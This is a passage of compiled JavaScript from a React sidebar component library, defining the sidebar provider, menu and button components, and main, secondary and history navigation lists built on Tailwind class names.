var SIDEBAR_KEYBOARD_SHORTCUT = "b";
var SidebarContext = React9.createContext(null);
function useSidebar() {
    var context = React9.useContext(SidebarContext);
    if (!context) {
        throw new Error("useSidebar must be used within a SidebarProvider.");
    }
    return context;
}
var SidebarProvider = React9.forwardRef(function(_param, ref) {
    var _param_defaultOpen = _param.defaultOpen, defaultOpen = _param_defaultOpen === void 0 ? true : _param_defaultOpen, openProp = _param.open, setOpenProp = _param.onOpenChange, className = _param.className, style = _param.style, children = _param.children, props = _object_without_properties(_param, [
        "defaultOpen",
        "open",
        "onOpenChange",
        "className",
        "style",
        "children"
    ]);
    var isMobile = useIsMobile();
    var _React9_useState = _sliced_to_array(React9.useState(false), 2), openMobile = _React9_useState[0], setOpenMobile = _React9_useState[1];
    var _React9_useState1 = _sliced_to_array(React9.useState(defaultOpen), 2), _open = _React9_useState1[0], _setOpen = _React9_useState1[1];
    var open = openProp !== null && openProp !== void 0 ? openProp : _open;
    var setOpen = React9.useCallback(function(value) {
        var openState = typeof value === "function" ? value(open) : value;
        if (setOpenProp) {
            setOpenProp(openState);
        } else {
            _setOpen(openState);
        }
        document.cookie = "".concat(SIDEBAR_COOKIE_NAME, "=").concat(openState, "; path=/; max-age=").concat(SIDEBAR_COOKIE_MAX_AGE);
    }, [
        setOpenProp,
        open
    ]);
    var toggleSidebar = React9.useCallback(function() {
        return isMobile ? setOpenMobile(function(open2) {
            return !open2;
        }) : setOpen(function(open2) {
            return !open2;
        });
    }, [
        isMobile,
        setOpen,
        setOpenMobile
    ]);
    React9.useEffect(function() {
        var handleKeyDown = function(event) {
            if (event.key === SIDEBAR_KEYBOARD_SHORTCUT && (event.metaKey || event.ctrlKey)) {
                event.preventDefault();
                toggleSidebar();
            }
        };
        window.addEventListener("keydown", handleKeyDown);
        return function() {
            return window.removeEventListener("keydown", handleKeyDown);
        };
    }, [
        toggleSidebar
    ]);
    var state = open ? "expanded" : "collapsed";
    var contextValue = React9.useMemo(function() {
        return {
            state: state,
            open: open,
            setOpen: setOpen,
            isMobile: isMobile,
            openMobile: openMobile,
            setOpenMobile: setOpenMobile,
            toggleSidebar: toggleSidebar
        };
    }, [
        state,
        open,
        setOpen,
        isMobile,
        openMobile,
        setOpenMobile,
        toggleSidebar
    ]);
    return /* @__PURE__ */ (0, import_jsx_runtime11.jsx)(SidebarContext.Provider, {
        value: contextValue,
        children: /* @__PURE__ */ (0, import_jsx_runtime11.jsx)(TooltipProvider, {
            delayDuration: 0,
            children: /* @__PURE__ */ (0, import_jsx_runtime11.jsx)("div", _object_spread_props(_object_spread({
                style: _object_spread({
                    "--sidebar-width": SIDEBAR_WIDTH,
                    "--sidebar-width-icon": SIDEBAR_WIDTH_ICON
                }, style),
                className: cn("group/sidebar-wrapper flex min-h-svh w-full has-[[data-variant=inset]]:bg-sidebar", className),
                ref: ref
            }, props), {
                children: children
            }))
        })
    });
});
SidebarProvider.displayName = "SidebarProvider";
var Sidebar = React9.forwardRef(function(_param, ref) {
    var _param_side = _param.side, side = _param_side === void 0 ? "left" : _param_side, _param_variant = _param.variant, variant = _param_variant === void 0 ? "sidebar" : _param_variant, _param_collapsible = _param.collapsible, collapsible = _param_collapsible === void 0 ? "offcanvas" : _param_collapsible, className = _param.className, children = _param.children, props = _object_without_properties(_param, [
        "side",
        "variant",
        "collapsible",
        "className",
        "children"
    ]);
    var _useSidebar = useSidebar(), isMobile = _useSidebar.isMobile, state = _useSidebar.state, openMobile = _useSidebar.openMobile, setOpenMobile = _useSidebar.setOpenMobile;
    if (collapsible === "none") {
        return /* @__PURE__ */ (0, import_jsx_runtime11.jsx)("div", _object_spread_props(_object_spread({
            className: cn("flex h-full w-[--sidebar-width] flex-col bg-sidebar text-sidebar-foreground", className),
            ref: ref
        }, props), {
            children: children
        }));
    }
    if (isMobile) {
        return /* @__PURE__ */ (0, import_jsx_runtime11.jsx)(Sheet, _object_spread_props(_object_spread({
            open: openMobile,
            onOpenChange: setOpenMobile
        }, props), {
            children: /* @__PURE__ */ (0, import_jsx_runtime11.jsxs)(SheetContent, {
                "data-sidebar": "sidebar",
                "data-mobile": "true",
                className: "w-[--sidebar-width] bg-sidebar p-0 text-sidebar-foreground [&>button]:hidden",
                style: {
                    "--sidebar-width": SIDEBAR_WIDTH_MOBILE
                },
                side: side,
                children: [
                    /* @__PURE__ */ (0, import_jsx_runtime11.jsxs)(SheetHeader, {
                        className: "sr-only",
                        children: [
                            /* @__PURE__ */ (0, import_jsx_runtime11.jsx)(SheetTitle, {
                                children: "Sidebar"
                            }),
                            /* @__PURE__ */ (0, import_jsx_runtime11.jsx)(SheetDescription, {
                                children: "Displays the mobile sidebar."
                            })
                        ]
                    }),
                    /* @__PURE__ */ (0, import_jsx_runtime11.jsx)("div", {
                        className: "flex h-full w-full flex-col",
                        children: children
                    })
                ]
            })
        }));
    }
    return /* @__PURE__ */ (0, import_jsx_runtime11.jsxs)("div", {
        ref: ref,
        className: "group peer hidden text-sidebar-foreground md:block",
        "data-state": state,
        "data-collapsible": state === "collapsed" ? collapsible : "",
        "data-variant": variant,
        "data-side": side,
        children: [
            /* @__PURE__ */ (0, import_jsx_runtime11.jsx)("div", {
                className: cn("relative w-[--sidebar-width] bg-transparent transition-[width] duration-200 ease-linear", "group-data-[collapsible=offcanvas]:w-0", "group-data-[side=right]:rotate-180", variant === "floating" || variant === "inset" ? "group-data-[collapsible=icon]:w-[calc(var(--sidebar-width-icon)_+_theme(spacing.4))]" : "group-data-[collapsible=icon]:w-[--sidebar-width-icon]")
            }),
            /* @__PURE__ */ (0, import_jsx_runtime11.jsx)("div", _object_spread_props(_object_spread({
                className: cn("fixed inset-y-0 z-10 hidden h-svh w-[--sidebar-width] transition-[left,right,width] duration-200 ease-linear md:flex", side === "left" ? "left-0 group-data-[collapsible=offcanvas]:left-[calc(var(--sidebar-width)*-1)]" : "right-0 group-data-[collapsible=offcanvas]:right-[calc(var(--sidebar-width)*-1)]", // Adjust the padding for floating and inset variants.
                variant === "floating" || variant === "inset" ? "p-2 group-data-[collapsible=icon]:w-[calc(var(--sidebar-width-icon)_+_theme(spacing.4)_+2px)]" : "group-data-[collapsible=icon]:w-[--sidebar-width-icon] group-data-[side=left]:border-r group-data-[side=right]:border-l", className)
            }, props), {
                children: /* @__PURE__ */ (0, import_jsx_runtime11.jsx)("div", {
                    "data-sidebar": "sidebar",
                    className: "flex h-full w-full flex-col bg-sidebar group-data-[variant=floating]:rounded-lg group-data-[variant=floating]:border group-data-[variant=floating]:border-sidebar-border group-data-[variant=floating]:shadow",
                    children: children
                })
            }))
        ]
    });
});
Sidebar.displayName = "Sidebar";
var SidebarTrigger = React9.forwardRef(function(_param, ref) {
    var className = _param.className, onClick = _param.onClick, props = _object_without_properties(_param, [
        "className",
        "onClick"
    ]);
    var toggleSidebar = useSidebar().toggleSidebar;
    return /* @__PURE__ */ (0, import_jsx_runtime11.jsxs)(Button, _object_spread_props(_object_spread({
        ref: ref,
        "data-sidebar": "trigger",
        variant: "ghost",
        size: "icon",
        className: cn("h-7 w-7", className),
        onClick: function(event) {
            onClick === null || onClick === void 0 ? void 0 : onClick(event);
            toggleSidebar();
        }
    }, props), {
        children: [
            /* @__PURE__ */ (0, import_jsx_runtime11.jsx)(import_react_icons.ViewVerticalIcon, {}),
            /* @__PURE__ */ (0, import_jsx_runtime11.jsx)("span", {
                className: "sr-only",
                children: "Toggle Sidebar"
            })
        ]
    }));
});
SidebarTrigger.displayName = "SidebarTrigger";
var SidebarRail = React9.forwardRef(function(_param, ref) {
    var className = _param.className, props = _object_without_properties(_param, [
        "className"
    ]);
    var toggleSidebar = useSidebar().toggleSidebar;
    return /* @__PURE__ */ (0, import_jsx_runtime11.jsx)("button", _object_spread({
        ref: ref,
        "data-sidebar": "rail",
        "aria-label": "Toggle Sidebar",
        tabIndex: -1,
        onClick: toggleSidebar,
        title: "Toggle Sidebar",
        className: cn("absolute inset-y-0 z-20 hidden w-4 -translate-x-1/2 transition-all ease-linear after:absolute after:inset-y-0 after:left-1/2 after:w-[2px] hover:after:bg-sidebar-border group-data-[side=left]:-right-4 group-data-[side=right]:left-0 sm:flex", "[[data-side=left]_&]:cursor-w-resize [[data-side=right]_&]:cursor-e-resize", "[[data-side=left][data-state=collapsed]_&]:cursor-e-resize [[data-side=right][data-state=collapsed]_&]:cursor-w-resize", "group-data-[collapsible=offcanvas]:translate-x-0 group-data-[collapsible=offcanvas]:after:left-full group-data-[collapsible=offcanvas]:hover:bg-sidebar", "[[data-side=left][data-collapsible=offcanvas]_&]:-right-2", "[[data-side=right][data-collapsible=offcanvas]_&]:-left-2", className)
    }, props));
});
SidebarRail.displayName = "SidebarRail";
var SidebarInset = React9.forwardRef(function(_param, ref) {
    var className = _param.className, props = _object_without_properties(_param, [
        "className"
    ]);
    return /* @__PURE__ */ (0, import_jsx_runtime11.jsx)("main", _object_spread({
        ref: ref,
        className: cn("relative flex w-full flex-1 flex-col bg-background", "md:peer-data-[variant=inset]:m-2 md:peer-data-[state=collapsed]:peer-data-[variant=inset]:ml-2 md:peer-data-[variant=inset]:ml-0 md:peer-data-[variant=inset]:rounded-xl md:peer-data-[variant=inset]:shadow", className)
    }, props));
});
SidebarInset.displayName = "SidebarInset";
var SidebarInput = React9.forwardRef(function(_param, ref) {
    var className = _param.className, props = _object_without_properties(_param, [
        "className"
    ]);
    return /* @__PURE__ */ (0, import_jsx_runtime11.jsx)(Input, _object_spread({
        ref: ref,
        "data-sidebar": "input",
        className: cn("h-8 w-full bg-background shadow-none focus-visible:ring-2 focus-visible:ring-sidebar-ring", className)
    }, props));
});
SidebarInput.displayName = "SidebarInput";
var SidebarHeader = React9.forwardRef(function(_param, ref) {
    var className = _param.className, props = _object_without_properties(_param, [
        "className"
    ]);
    return /* @__PURE__ */ (0, import_jsx_runtime11.jsx)("div", _object_spread({
        ref: ref,
        "data-sidebar": "header",
        className: cn("flex flex-col gap-2 p-2", className)
    }, props));
});
SidebarHeader.displayName = "SidebarHeader";
var SidebarFooter = React9.forwardRef(function(_param, ref) {
    var className = _param.className, props = _object_without_properties(_param, [
        "className"
    ]);
    return /* @__PURE__ */ (0, import_jsx_runtime11.jsx)("div", _object_spread({
        ref: ref,
        "data-sidebar": "footer",
        className: cn("flex flex-col gap-2 p-2", className)
    }, props));
});
SidebarFooter.displayName = "SidebarFooter";
var SidebarSeparator = React9.forwardRef(function(_param, ref) {
    var className = _param.className, props = _object_without_properties(_param, [
        "className"
    ]);
    return /* @__PURE__ */ (0, import_jsx_runtime11.jsx)(Separator2, _object_spread({
        ref: ref,
        "data-sidebar": "separator",
        className: cn("mx-2 w-auto bg-sidebar-border", className)
    }, props));
});
SidebarSeparator.displayName = "SidebarSeparator";
var SidebarContent = React9.forwardRef(function(_param, ref) {
    var className = _param.className, props = _object_without_properties(_param, [
        "className"
    ]);
    return /* @__PURE__ */ (0, import_jsx_runtime11.jsx)("div", _object_spread({
        ref: ref,
        "data-sidebar": "content",
        className: cn("flex min-h-0 flex-1 flex-col gap-2 overflow-auto group-data-[collapsible=icon]:overflow-hidden", className)
    }, props));
});
SidebarContent.displayName = "SidebarContent";
var SidebarGroup = React9.forwardRef(function(_param, ref) {
    var className = _param.className, props = _object_without_properties(_param, [
        "className"
    ]);
    return /* @__PURE__ */ (0, import_jsx_runtime11.jsx)("div", _object_spread({
        ref: ref,
        "data-sidebar": "group",
        className: cn("relative flex w-full min-w-0 flex-col p-2", className)
    }, props));
});
SidebarGroup.displayName = "SidebarGroup";
var SidebarGroupLabel = React9.forwardRef(function(_param, ref) {
    var className = _param.className, _param_asChild = _param.asChild, asChild = _param_asChild === void 0 ? false : _param_asChild, props = _object_without_properties(_param, [
        "className",
        "asChild"
    ]);
    var Comp = asChild ? import_react_slot2.Slot : "div";
    return /* @__PURE__ */ (0, import_jsx_runtime11.jsx)(Comp, _object_spread({
        ref: ref,
        "data-sidebar": "group-label",
        className: cn("flex h-8 shrink-0 items-center rounded-md px-2 text-xs font-medium text-sidebar-foreground/70 outline-none ring-sidebar-ring transition-[margin,opacity] duration-200 ease-linear focus-visible:ring-2 [&>svg]:size-4 [&>svg]:shrink-0", "group-data-[collapsible=icon]:-mt-8 group-data-[collapsible=icon]:opacity-0", className)
    }, props));
});
SidebarGroupLabel.displayName = "SidebarGroupLabel";
var SidebarGroupAction = React9.forwardRef(function(_param, ref) {
    var className = _param.className, _param_asChild = _param.asChild, asChild = _param_asChild === void 0 ? false : _param_asChild, props = _object_without_properties(_param, [
        "className",
        "asChild"
    ]);
    var Comp = asChild ? import_react_slot2.Slot : "button";
    return /* @__PURE__ */ (0, import_jsx_runtime11.jsx)(Comp, _object_spread({
        ref: ref,
        "data-sidebar": "group-action",
        className: cn("absolute right-3 top-3.5 flex aspect-square w-5 items-center justify-center rounded-md p-0 text-sidebar-foreground outline-none ring-sidebar-ring transition-transform hover:bg-sidebar-accent hover:text-sidebar-accent-foreground focus-visible:ring-2 [&>svg]:size-4 [&>svg]:shrink-0", // Increases the hit area of the button on mobile.
        "after:absolute after:-inset-2 after:md:hidden", "group-data-[collapsible=icon]:hidden", className)
    }, props));
});
SidebarGroupAction.displayName = "SidebarGroupAction";
var SidebarGroupContent = React9.forwardRef(function(_param, ref) {
    var className = _param.className, props = _object_without_properties(_param, [
        "className"
    ]);
    return /* @__PURE__ */ (0, import_jsx_runtime11.jsx)("div", _object_spread({
        ref: ref,
        "data-sidebar": "group-content",
        className: cn("w-full text-sm", className)
    }, props));
});
SidebarGroupContent.displayName = "SidebarGroupContent";
var SidebarMenu = React9.forwardRef(function(_param, ref) {
    var className = _param.className, props = _object_without_properties(_param, [
        "className"
    ]);
    return /* @__PURE__ */ (0, import_jsx_runtime11.jsx)("ul", _object_spread({
        ref: ref,
        "data-sidebar": "menu",
        className: cn("flex w-full min-w-0 flex-col gap-1", className)
    }, props));
});
SidebarMenu.displayName = "SidebarMenu";
var SidebarMenuItem = React9.forwardRef(function(_param, ref) {
    var className = _param.className, props = _object_without_properties(_param, [
        "className"
    ]);
    return /* @__PURE__ */ (0, import_jsx_runtime11.jsx)("li", _object_spread({
        ref: ref,
        "data-sidebar": "menu-item",
        className: cn("group/menu-item relative", className)
    }, props));
});
SidebarMenuItem.displayName = "SidebarMenuItem";
var sidebarMenuButtonVariants = (0, import_class_variance_authority3.cva)("peer/menu-button flex w-full items-center gap-2 overflow-hidden rounded-md p-2 text-left text-sm outline-none ring-sidebar-ring transition-[width,height,padding] hover:bg-sidebar-accent hover:text-sidebar-accent-foreground focus-visible:ring-2 active:bg-sidebar-accent active:text-sidebar-accent-foreground disabled:pointer-events-none disabled:opacity-50 group-has-[[data-sidebar=menu-action]]/menu-item:pr-8 aria-disabled:pointer-events-none aria-disabled:opacity-50 data-[active=true]:bg-sidebar-accent data-[active=true]:font-medium data-[active=true]:text-sidebar-accent-foreground data-[state=open]:hover:bg-sidebar-accent data-[state=open]:hover:text-sidebar-accent-foreground group-data-[collapsible=icon]:!size-8 group-data-[collapsible=icon]:!p-2 [&>span:last-child]:truncate [&>svg]:size-4 [&>svg]:shrink-0", {
    variants: {
        variant: {
            default: "hover:bg-sidebar-accent hover:text-sidebar-accent-foreground",
            outline: "bg-background shadow-[0_0_0_1px_hsl(var(--sidebar-border))] hover:bg-sidebar-accent hover:text-sidebar-accent-foreground hover:shadow-[0_0_0_1px_hsl(var(--sidebar-accent))]"
        },
        size: {
            default: "h-8 text-sm",
            sm: "h-7 text-xs",
            lg: "h-12 text-sm group-data-[collapsible=icon]:!p-0"
        }
    },
    defaultVariants: {
        variant: "default",
        size: "default"
    }
});
var SidebarMenuButton = React9.forwardRef(function(_param, ref) {
    var _param_asChild = _param.asChild, asChild = _param_asChild === void 0 ? false : _param_asChild, _param_isActive = _param.isActive, isActive = _param_isActive === void 0 ? false : _param_isActive, _param_variant = _param.variant, variant = _param_variant === void 0 ? "default" : _param_variant, _param_size = _param.size, size = _param_size === void 0 ? "default" : _param_size, tooltip = _param.tooltip, className = _param.className, props = _object_without_properties(_param, [
        "asChild",
        "isActive",
        "variant",
        "size",
        "tooltip",
        "className"
    ]);
    var Comp = asChild ? import_react_slot2.Slot : "button";
    var _useSidebar = useSidebar(), isMobile = _useSidebar.isMobile, state = _useSidebar.state;
    var button = /* @__PURE__ */ (0, import_jsx_runtime11.jsx)(Comp, _object_spread({
        ref: ref,
        "data-sidebar": "menu-button",
        "data-size": size,
        "data-active": isActive,
        className: cn(sidebarMenuButtonVariants({
            variant: variant,
            size: size
        }), className)
    }, props));
    if (!tooltip) {
        return button;
    }
    if (typeof tooltip === "string") {
        tooltip = {
            children: tooltip
        };
    }
    return /* @__PURE__ */ (0, import_jsx_runtime11.jsxs)(Tooltip, {
        children: [
            /* @__PURE__ */ (0, import_jsx_runtime11.jsx)(TooltipTrigger, {
                asChild: true,
                children: button
            }),
            /* @__PURE__ */ (0, import_jsx_runtime11.jsx)(TooltipContent, _object_spread({
                side: "right",
                align: "center",
                hidden: state !== "collapsed" || isMobile
            }, tooltip))
        ]
    });
});
SidebarMenuButton.displayName = "SidebarMenuButton";
var SidebarMenuAction = React9.forwardRef(function(_param, ref) {
    var className = _param.className, _param_asChild = _param.asChild, asChild = _param_asChild === void 0 ? false : _param_asChild, _param_showOnHover = _param.showOnHover, showOnHover = _param_showOnHover === void 0 ? false : _param_showOnHover, props = _object_without_properties(_param, [
        "className",
        "asChild",
        "showOnHover"
    ]);
    var Comp = asChild ? import_react_slot2.Slot : "button";
    return /* @__PURE__ */ (0, import_jsx_runtime11.jsx)(Comp, _object_spread({
        ref: ref,
        "data-sidebar": "menu-action",
        className: cn("absolute right-1 top-1.5 flex aspect-square w-5 items-center justify-center rounded-md p-0 text-sidebar-foreground outline-none ring-sidebar-ring transition-transform hover:bg-sidebar-accent hover:text-sidebar-accent-foreground focus-visible:ring-2 peer-hover/menu-button:text-sidebar-accent-foreground [&>svg]:size-4 [&>svg]:shrink-0", // Increases the hit area of the button on mobile.
        "after:absolute after:-inset-2 after:md:hidden", "peer-data-[size=sm]/menu-button:top-1", "peer-data-[size=default]/menu-button:top-1.5", "peer-data-[size=lg]/menu-button:top-2.5", "group-data-[collapsible=icon]:hidden", showOnHover && "group-focus-within/menu-item:opacity-100 group-hover/menu-item:opacity-100 data-[state=open]:opacity-100 peer-data-[active=true]/menu-button:text-sidebar-accent-foreground md:opacity-0", className)
    }, props));
});
SidebarMenuAction.displayName = "SidebarMenuAction";
var SidebarMenuBadge = React9.forwardRef(function(_param, ref) {
    var className = _param.className, props = _object_without_properties(_param, [
        "className"
    ]);
    return /* @__PURE__ */ (0, import_jsx_runtime11.jsx)("div", _object_spread({
        ref: ref,
        "data-sidebar": "menu-badge",
        className: cn("pointer-events-none absolute right-1 flex h-5 min-w-5 select-none items-center justify-center rounded-md px-1 text-xs font-medium tabular-nums text-sidebar-foreground", "peer-hover/menu-button:text-sidebar-accent-foreground peer-data-[active=true]/menu-button:text-sidebar-accent-foreground", "peer-data-[size=sm]/menu-button:top-1", "peer-data-[size=default]/menu-button:top-1.5", "peer-data-[size=lg]/menu-button:top-2.5", "group-data-[collapsible=icon]:hidden", className)
    }, props));
});
SidebarMenuBadge.displayName = "SidebarMenuBadge";
var SidebarMenuSkeleton = React9.forwardRef(function(_param, ref) {
    var className = _param.className, _param_showIcon = _param.showIcon, showIcon = _param_showIcon === void 0 ? false : _param_showIcon, props = _object_without_properties(_param, [
        "className",
        "showIcon"
    ]);
    var width = React9.useMemo(function() {
        return "".concat(Math.floor(Math.random() * 40) + 50, "%");
    }, []);
    return /* @__PURE__ */ (0, import_jsx_runtime11.jsxs)("div", _object_spread_props(_object_spread({
        ref: ref,
        "data-sidebar": "menu-skeleton",
        className: cn("flex h-8 items-center gap-2 rounded-md px-2", className)
    }, props), {
        children: [
            showIcon && /* @__PURE__ */ (0, import_jsx_runtime11.jsx)(Skeleton, {
                className: "size-4 rounded-md",
                "data-sidebar": "menu-skeleton-icon"
            }),
            /* @__PURE__ */ (0, import_jsx_runtime11.jsx)(Skeleton, {
                className: "h-4 max-w-[--skeleton-width] flex-1",
                "data-sidebar": "menu-skeleton-text",
                style: {
                    "--skeleton-width": width
                }
            })
        ]
    }));
});
SidebarMenuSkeleton.displayName = "SidebarMenuSkeleton";
var SidebarMenuSub = React9.forwardRef(function(_param, ref) {
    var className = _param.className, props = _object_without_properties(_param, [
        "className"
    ]);
    return /* @__PURE__ */ (0, import_jsx_runtime11.jsx)("ul", _object_spread({
        ref: ref,
        "data-sidebar": "menu-sub",
        className: cn("mx-3.5 flex min-w-0 translate-x-px flex-col gap-1 border-l border-sidebar-border px-2.5 py-0.5", "group-data-[collapsible=icon]:hidden", className)
    }, props));
});
SidebarMenuSub.displayName = "SidebarMenuSub";
var SidebarMenuSubItem = React9.forwardRef(function(_param, ref) {
    var props = _extends({}, _object_destructuring_empty(_param));
    return /* @__PURE__ */ (0, import_jsx_runtime11.jsx)("li", _object_spread({
        ref: ref
    }, props));
});
SidebarMenuSubItem.displayName = "SidebarMenuSubItem";
var SidebarMenuSubButton = React9.forwardRef(function(_param, ref) {
    var _param_asChild = _param.asChild, asChild = _param_asChild === void 0 ? false : _param_asChild, _param_size = _param.size, size = _param_size === void 0 ? "md" : _param_size, isActive = _param.isActive, className = _param.className, props = _object_without_properties(_param, [
        "asChild",
        "size",
        "isActive",
        "className"
    ]);
    var Comp = asChild ? import_react_slot2.Slot : "a";
    return /* @__PURE__ */ (0, import_jsx_runtime11.jsx)(Comp, _object_spread({
        ref: ref,
        "data-sidebar": "menu-sub-button",
        "data-size": size,
        "data-active": isActive,
        className: cn("flex h-7 min-w-0 -translate-x-px items-center gap-2 overflow-hidden rounded-md px-2 text-sidebar-foreground outline-none ring-sidebar-ring hover:bg-sidebar-accent hover:text-sidebar-accent-foreground focus-visible:ring-2 active:bg-sidebar-accent active:text-sidebar-accent-foreground disabled:pointer-events-none disabled:opacity-50 aria-disabled:pointer-events-none aria-disabled:opacity-50 [&>span:last-child]:truncate [&>svg]:size-4 [&>svg]:shrink-0 [&>svg]:text-sidebar-accent-foreground", "data-[active=true]:bg-sidebar-accent data-[active=true]:text-sidebar-accent-foreground", size === "sm" && "text-xs", size === "md" && "text-sm", "group-data-[collapsible=icon]:hidden", className)
    }, props));
});
SidebarMenuSubButton.displayName = "SidebarMenuSubButton";
// src/components/sidebar/nav-main.tsx
var import_jsx_runtime12 = require("react/jsx-runtime");
function NavMain(param) {
    var items = param.items, maxItems = param.maxItems;
    var displayItems = maxItems ? items.slice(0, maxItems) : items;
    return /* @__PURE__ */ (0, import_jsx_runtime12.jsx)(SidebarMenu, {
        children: displayItems.map(function(item) {
            return /* @__PURE__ */ (0, import_jsx_runtime12.jsx)(SidebarMenuItem, {
                children: /* @__PURE__ */ (0, import_jsx_runtime12.jsx)(SidebarMenuButton, {
                    asChild: true,
                    isActive: item.isActive,
                    className: "py-1.5",
                    children: /* @__PURE__ */ (0, import_jsx_runtime12.jsxs)("a", {
                        href: item.url,
                        title: item.title,
                        children: [
                            /* @__PURE__ */ (0, import_jsx_runtime12.jsx)(item.icon, {
                                className: "h-4 w-4"
                            }),
                            /* @__PURE__ */ (0, import_jsx_runtime12.jsx)("span", {
                                className: "truncate",
                                children: item.title
                            })
                        ]
                    })
                })
            }, item.title);
        })
    });
}
// src/components/sidebar/nav-secondary.tsx
var import_jsx_runtime13 = require("react/jsx-runtime");
function NavSecondary(_param) {
    var items = _param.items, maxItems = _param.maxItems, props = _object_without_properties(_param, [
        "items",
        "maxItems"
    ]);
    var displayItems = maxItems ? items.slice(0, maxItems) : items;
    return /* @__PURE__ */ (0, import_jsx_runtime13.jsx)(SidebarGroup, _object_spread_props(_object_spread({}, props), {
        children: /* @__PURE__ */ (0, import_jsx_runtime13.jsx)(SidebarGroupContent, {
            children: /* @__PURE__ */ (0, import_jsx_runtime13.jsx)(SidebarMenu, {
                children: displayItems.map(function(item) {
                    return /* @__PURE__ */ (0, import_jsx_runtime13.jsxs)(SidebarMenuItem, {
                        children: [
                            /* @__PURE__ */ (0, import_jsx_runtime13.jsx)(SidebarMenuButton, {
                                asChild: true,
                                className: "py-1.5",
                                children: /* @__PURE__ */ (0, import_jsx_runtime13.jsxs)("a", {
                                    href: item.url,
                                    title: item.title,
                                    children: [
                                        /* @__PURE__ */ (0, import_jsx_runtime13.jsx)(item.icon, {
                                            className: "h-4 w-4"
                                        }),
                                        /* @__PURE__ */ (0, import_jsx_runtime13.jsx)("span", {
                                            className: "truncate",
                                            children: item.title
                                        })
                                    ]
                                })
                            }),
                            item.badge && /* @__PURE__ */ (0, import_jsx_runtime13.jsx)(SidebarMenuBadge, {
                                children: item.badge
                            })
                        ]
                    }, item.title);
                })
            })
        })
    }));
}
// src/components/sidebar/nav-history.tsx
var import_lucide_react5 = require("lucide-react");
var import_react_icons2 = require("@radix-ui/react-icons");
var import_jsx_runtime14 = require("react/jsx-runtime");
function NavHistory(param) {
    var history = param.history, _param_maxItems = param.maxItems, maxItems = _param_maxItems === void 0 ? 5 : _param_maxItems;
    var isMobile = useSidebar().isMobile;
    var displayHistory = history.slice(0, maxItems);
    var remainingCount = Math.max(0, history.length - maxItems);
    return /* @__PURE__ */ (0, import_jsx_runtime14.jsxs)(SidebarGroup, {
        className: "group-data-[collapsible=icon]:hidden",
        children: [
            /* @__PURE__ */ (0, import_jsx_runtime14.jsxs)(SidebarGroupLabel, {
                className: "flex justify-between items-center",
                children: [
                    /* @__PURE__ */ (0, import_jsx_runtime14.jsx)("span", {
                        children: "History"
                    }),
                    remainingCount > 0 && /* @__PURE__ */ (0, import_jsx_runtime14.jsxs)("span", {
                        className: "text-xs text-muted-foreground",
                        children: [
                            history.length,
                            " items"
                        ]
                    })
                ]
            }),
            /* @__PURE__ */ (0, import_jsx_runtime14.jsxs)(SidebarMenu, {
                children: [
                    displayHistory.map(function(item) {
                        return /* @__PURE__ */ (0, import_jsx_runtime14.jsxs)(SidebarMenuItem, {
                            children: [
                                /* @__PURE__ */ (0, import_jsx_runtime14.jsx)(SidebarMenuButton, {
                                    asChild: true,
                                    className: "py-1.5",
                                    children: /* @__PURE__ */ (0, import_jsx_runtime14.jsxs)("a", {
                                        href: item.url,
                                        title: item.name,
                                        children: [
                                            /* @__PURE__ */ (0, import_jsx_runtime14.jsx)("span", {
                                                className: "truncate",
                                                children: item.name
                                            }),
                                            item.date && /* @__PURE__ */ (0, import_jsx_runtime14.jsx)("span", {
                                                className: "ml-auto text-xs text-muted-foreground hidden sm:inline-block",
                                                children: item.date
                                            })
                                        ]
                                    })
                                }),
                                /* @__PURE__ */ (0, import_jsx_runtime14.jsxs)(DropdownMenu, {
                                    children: [
                                        /* @__PURE__ */ (0, import_jsx_runtime14.jsx)(DropdownMenuTrigger, {
                                            asChild: true,
                                            children: /* @__PURE__ */ (0, import_jsx_runtime14.jsxs)(SidebarMenuAction, {
                                                showOnHover: true,
                                                children: [
                                                    /* @__PURE__ */ (0, import_jsx_runtime14.jsx)(import_react_icons2.DotsHorizontalIcon, {}),
                                                    /* @__PURE__ */ (0, import_jsx_runtime14.jsx)("span", {
                                                        className: "sr-only",
                                                        children: "More"
                                                    })
                                                ]
                                            })
                                        }),
                                        /* @__PURE__ */ (0, import_jsx_runtime14.jsxs)(DropdownMenuContent, {
                                            className: "w-56 rounded-lg",
                                            side: isMobile ? "bottom" : "right",
                                            align: isMobile ? "end" : "start",
                                            children: [
                                                /* @__PURE__ */ (0, import_jsx_runtime14.jsxs)(DropdownMenuItem, {
                                                    children: [
                                                        /* @__PURE__ */ (0, import_jsx_runtime14.jsx)(import_lucide_react5.Clock, {
                                                            className: "text-muted-foreground"
                                                        }),
                                                        /* @__PURE__ */ (0, import_jsx_runtime14.jsx)("span", {
                                                            children: "Remove from History"
                                                        })
                                                    ]
                                                }),
                                                /* @__PURE__ */ (0, import_jsx_runtime14.jsx)(DropdownMenuSeparator, {}),
                                                /* @__PURE__ */ (0, import_jsx_runtime14.jsxs)(DropdownMenuItem, {
                                                    children: [
                                                        /* @__PURE__ */ (0, import_jsx_runtime14.jsx)(import_lucide_react5.Link, {
                                                            className: "text-muted-foreground"
                                                        }),
                                                        /* @__PURE__ */ (0, import_jsx_runtime14.jsx)("span", {
                                                            children: "Copy Link"
                                                        })
                                                    ]
                                                }),
                                                /* @__PURE__ */ (0, import_jsx_runtime14.jsxs)(DropdownMenuItem, {
                                                    children: [
                                                        /* @__PURE__ */ (0, import_jsx_runtime14.jsx)(import_lucide_react5.ArrowUpRight, {
                                                            className: "text-muted-foreground"
                                                        }),
                                                        /* @__PURE__ */ (0, import_jsx_runtime14.jsx)("span", {
                                                            children: "Open in New Tab"
                                                        })
                                                    ]
                                                }),
                                                /* @__PURE__ */ (0, import_jsx_runtime14.jsx)(DropdownMenuSeparator, {}),
                                                /* @__PURE__ */ (0, import_jsx_runtime14.jsxs)(DropdownMenuItem, {
                                                    children: [
                                                        /* @__PURE__ */ (0, import_jsx_runtime14.jsx)(import_lucide_react5.Trash2, {
                                                            className: "text-muted-foreground"
                                                        }),
                                                        /* @__PURE__ */ (0, import_jsx_runtime14.jsx)("span", {
                                                            children: "Delete"
                                                        })
                                                    ]
                                                })
                                            ]
                                        })
                                    ]
                                })
                            ]
                        }, item.name);
                    }),
                    remainingCount > 0 && /* @__PURE__ */ (0, import_jsx_runtime14.jsx)(SidebarMenuItem, {
                        children: /* @__PURE__ */ (0, import_jsx_runtime14.jsxs)(SidebarMenuButton, {
                            className: "text-sidebar-foreground/70 py-1.5",
                            children: [
                                /* @__PURE__ */ (0, import_jsx_runtime14.jsx)(import_lucide_react5.ChevronRight, {
                                    className: "h-3.5 w-3.5 mr-2"
                                }),
